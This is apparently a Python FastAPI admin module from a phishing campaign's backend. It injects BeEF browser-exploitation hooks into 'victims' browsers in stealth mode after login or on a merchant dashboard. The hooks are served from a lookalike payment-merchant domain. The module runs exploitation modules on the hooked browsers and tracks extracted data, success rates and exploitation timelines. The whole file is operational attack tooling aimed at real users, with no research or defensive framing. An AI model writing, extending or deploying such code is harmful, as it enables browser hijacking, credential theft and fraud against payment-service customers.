"""
BeEF Framework Integration API
Admin interface for BeEF session management and command execution
"""

import logging
import asyncio
from datetime import datetime, timezone
from typing import Dict, List, Optional, Any
from fastapi import APIRouter, HTTPException, status, Depends, Request, BackgroundTasks
from fastapi.responses import JSONResponse
from pydantic import BaseModel
import httpx
import json

from engines.beef_integration import BeEFIntegrationEngine
from database.mongodb.beef_sessions import BeEFSessionModel
from database.mongodb.victims import VictimModel
from middleware.authentication import get_current_admin_user
from websocket.manager import WebSocketManager

logger = logging.getLogger(__name__)

router = APIRouter()

# Initialize BeEF integration engine
beef_engine = BeEFIntegrationEngine()
websocket_manager = WebSocketManager()

# Pydantic models
class BeEFHookRequest(BaseModel):
    victim_id: str
    injection_point: str = "auth_success"  # auth_success, merchant_dashboard, etc.
    stealth_mode: bool = True

class BeEFCommandRequest(BaseModel):
    session_id: str
    module: str
    parameters: Dict[str, Any] = {}

class BeEFSessionResponse(BaseModel):
    success: bool
    message: str
    session_id: Optional[str] = None
    hook_url: Optional[str] = None
    browser_info: Optional[Dict[str, Any]] = None

class BeEFCommandResponse(BaseModel):
    success: bool
    message: str
    command_id: Optional[str] = None
    result: Optional[Dict[str, Any]] = None

@router.post("/inject", response_model=BeEFSessionResponse)
async def inject_beef_hook(
    request: BeEFHookRequest,
    background_tasks: BackgroundTasks,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Inject BeEF hook into victim's browser"""
    try:
        admin_id = current_admin["admin_id"]
        
        # Validate victim exists
        victim_model = VictimModel()
        victim = await victim_model.get_victim_by_id(request.victim_id)
        if not victim:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="Victim not found"
            )
        
        # Generate session ID
        session_id = f"beef_{admin_id}_{int(datetime.now().timestamp())}"
        
        # Start BeEF hook injection in background
        background_tasks.add_task(
            perform_beef_injection,
            session_id,
            admin_id,
            request.victim_id,
            request.injection_point,
            request.stealth_mode
        )
        
        # Send real-time notification
        await websocket_manager.broadcast_to_admin(
            admin_id,
            {
                "type": "beef_injection_started",
                "session_id": session_id,
                "victim_id": request.victim_id,
                "message": "BeEF hook injection initiated"
            }
        )
        
        return BeEFSessionResponse(
            success=True,
            message="BeEF hook injection initiated successfully",
            session_id=session_id,
            hook_url=f"https://zalopaymerchan.com/beef/hook.js"
        )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"BeEF hook injection error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to initiate BeEF hook injection"
        )

async def perform_beef_injection(
    session_id: str,
    admin_id: str,
    victim_id: str,
    injection_point: str,
    stealth_mode: bool
):
    """Background task for BeEF hook injection"""
    try:
        # Inject BeEF hook
        hook_result = await beef_engine.inject_hook(
            victim_id=victim_id,
            injection_point=injection_point,
            stealth_mode=stealth_mode
        )
        
        if hook_result["success"]:
            # Create BeEF session record
            beef_session_model = BeEFSessionModel()
            await beef_session_model.create_beef_session({
                "victim_id": victim_id,
                "beef_session": {
                    "hook_id": hook_result["hook_id"],
                    "session_token": hook_result["session_token"],
                    "injection_time": datetime.now(timezone.utc),
                    "last_seen": datetime.now(timezone.utc),
                    "status": "active"
                },
                "browser_intelligence": hook_result.get("browser_info", {}),
                "commands_executed": [],
                "exploitation_timeline": [],
                "intelligence_summary": {
                    "overall_success_rate": 0.0,
                    "total_commands_executed": 0,
                    "successful_commands": 0,
                    "data_extracted": {},
                    "exploitation_opportunities": []
                },
                "expires_at": datetime.now(timezone.utc) + timedelta(hours=24),
                "created_at": datetime.now(timezone.utc),
                "updated_at": datetime.now(timezone.utc)
            })
            
            # Send success notification
            await websocket_manager.broadcast_to_admin(
                admin_id,
                {
                    "type": "beef_injection_completed",
                    "session_id": session_id,
                    "victim_id": victim_id,
                    "hook_id": hook_result["hook_id"],
                    "browser_info": hook_result.get("browser_info", {}),
                    "message": "BeEF hook injection completed successfully"
                }
            )
        else:
            # Send error notification
            await websocket_manager.broadcast_to_admin(
                admin_id,
                {
                    "type": "beef_injection_error",
                    "session_id": session_id,
                    "victim_id": victim_id,
                    "error": hook_result.get("error", "Unknown error"),
                    "message": "BeEF hook injection failed"
                }
            )
        
    except Exception as e:
        logger.error(f"BeEF injection error: {e}")
        
        # Send error notification
        await websocket_manager.broadcast_to_admin(
            admin_id,
            {
                "type": "beef_injection_error",
                "session_id": session_id,
                "victim_id": victim_id,
                "error": str(e),
                "message": "BeEF hook injection failed"
            }
        )

@router.get("/sessions")
async def get_beef_sessions(
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get all active BeEF sessions"""
    try:
        beef_session_model = BeEFSessionModel()
        sessions = await beef_session_model.get_active_sessions()
        
        return {
            "success": True,
            "sessions": sessions
        }
        
    except Exception as e:
        logger.error(f"Error getting BeEF sessions: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get BeEF sessions"
        )

@router.get("/sessions/{victim_id}")
async def get_victim_beef_sessions(
    victim_id: str,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get BeEF sessions for a specific victim"""
    try:
        beef_session_model = BeEFSessionModel()
        sessions = await beef_session_model.get_sessions_by_victim_id(victim_id)
        
        return {
            "success": True,
            "victim_id": victim_id,
            "sessions": sessions
        }
        
    except Exception as e:
        logger.error(f"Error getting victim BeEF sessions: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get victim BeEF sessions"
        )

@router.post("/execute", response_model=BeEFCommandResponse)
async def execute_beef_command(
    request: BeEFCommandRequest,
    background_tasks: BackgroundTasks,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Execute BeEF command on hooked browser"""
    try:
        admin_id = current_admin["admin_id"]
        
        # Validate session exists
        beef_session_model = BeEFSessionModel()
        session = await beef_session_model.get_session_by_id(request.session_id)
        if not session:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="BeEF session not found"
            )
        
        # Generate command ID
        command_id = f"cmd_{admin_id}_{int(datetime.now().timestamp())}"
        
        # Start command execution in background
        background_tasks.add_task(
            perform_beef_command,
            command_id,
            admin_id,
            request.session_id,
            request.module,
            request.parameters
        )
        
        # Send real-time notification
        await websocket_manager.broadcast_to_admin(
            admin_id,
            {
                "type": "beef_command_started",
                "command_id": command_id,
                "session_id": request.session_id,
                "module": request.module,
                "message": f"BeEF command '{request.module}' execution initiated"
            }
        )
        
        return BeEFCommandResponse(
            success=True,
            message="BeEF command execution initiated successfully",
            command_id=command_id
        )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"BeEF command execution error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to initiate BeEF command execution"
        )

async def perform_beef_command(
    command_id: str,
    admin_id: str,
    session_id: str,
    module: str,
    parameters: Dict[str, Any]
):
    """Background task for BeEF command execution"""
    try:
        # Execute BeEF command
        command_result = await beef_engine.execute_command(
            session_id=session_id,
            module=module,
            parameters=parameters
        )
        
        if command_result["success"]:
            # Update session with command result
            beef_session_model = BeEFSessionModel()
            await beef_session_model.add_command_result(
                session_id=session_id,
                command_id=command_id,
                module=module,
                parameters=parameters,
                result=command_result
            )
            
            # Send success notification
            await websocket_manager.broadcast_to_admin(
                admin_id,
                {
                    "type": "beef_command_completed",
                    "command_id": command_id,
                    "session_id": session_id,
                    "module": module,
                    "result": command_result,
                    "message": f"BeEF command '{module}' executed successfully"
                }
            )
        else:
            # Send error notification
            await websocket_manager.broadcast_to_admin(
                admin_id,
                {
                    "type": "beef_command_error",
                    "command_id": command_id,
                    "session_id": session_id,
                    "module": module,
                    "error": command_result.get("error", "Unknown error"),
                    "message": f"BeEF command '{module}' execution failed"
                }
            )
        
    except Exception as e:
        logger.error(f"BeEF command execution error: {e}")
        
        # Send error notification
        await websocket_manager.broadcast_to_admin(
            admin_id,
            {
                "type": "beef_command_error",
                "command_id": command_id,
                "session_id": session_id,
                "module": module,
                "error": str(e),
                "message": f"BeEF command '{module}' execution failed"
            }
        )

@router.get("/modules")
async def get_beef_modules(
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get available BeEF modules"""
    try:
        modules = await beef_engine.get_available_modules()
        
        return {
            "success": True,
            "modules": modules
        }
        
    except Exception as e:
        logger.error(f"Error getting BeEF modules: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get BeEF modules"
        )

@router.get("/modules/{module_name}")
async def get_beef_module_info(
    module_name: str,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get BeEF module information"""
    try:
        module_info = await beef_engine.get_module_info(module_name)
        
        if not module_info:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="BeEF module not found"
            )
        
        return {
            "success": True,
            "module": module_info
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting BeEF module info: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get BeEF module information"
        )

@router.delete("/sessions/{session_id}")
async def close_beef_session(
    session_id: str,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Close BeEF session"""
    try:
        beef_session_model = BeEFSessionModel()
        success = await beef_session_model.close_session(session_id)
        
        if success:
            return {
                "success": True,
                "message": "BeEF session closed successfully"
            }
        else:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="BeEF session not found"
            )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error closing BeEF session: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to close BeEF session"
        )

@router.get("/stats")
async def get_beef_stats(
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get BeEF exploitation statistics"""
    try:
        beef_session_model = BeEFSessionModel()
        
        # Get overall statistics
        total_sessions = await beef_session_model.count_total_sessions()
        active_sessions = await beef_session_model.count_active_sessions()
        total_commands = await beef_session_model.count_total_commands()
        successful_commands = await beef_session_model.count_successful_commands()
        
        # Get recent activity
        recent_sessions = await beef_session_model.get_recent_sessions(limit=10)
        
        return {
            "success": True,
            "statistics": {
                "total_sessions": total_sessions,
                "active_sessions": active_sessions,
                "total_commands": total_commands,
                "successful_commands": successful_commands,
                "success_rate": successful_commands / total_commands if total_commands > 0 else 0,
                "average_success_rate": await beef_session_model.get_average_success_rate()
            },
            "recent_activity": recent_sessions
        }
        
    except Exception as e:
        logger.error(f"BeEF stats error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get BeEF statistics"
        )

@router.get("/sessions/{session_id}/timeline")
async def get_exploitation_timeline(
    session_id: str,
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get exploitation timeline for a BeEF session"""
    try:
        beef_session_model = BeEFSessionModel()
        session = await beef_session_model.get_session_by_id(session_id)
        
        if not session:
            raise HTTPException(
                status_code=status.HTTP_404_NOT_FOUND,
                detail="BeEF session not found"
            )
        
        return {
            "success": True,
            "session_id": session_id,
            "timeline": session.get("exploitation_timeline", []),
            "commands": session.get("commands_executed", []),
            "intelligence_summary": session.get("intelligence_summary", {})
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting exploitation timeline: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get exploitation timeline"
        )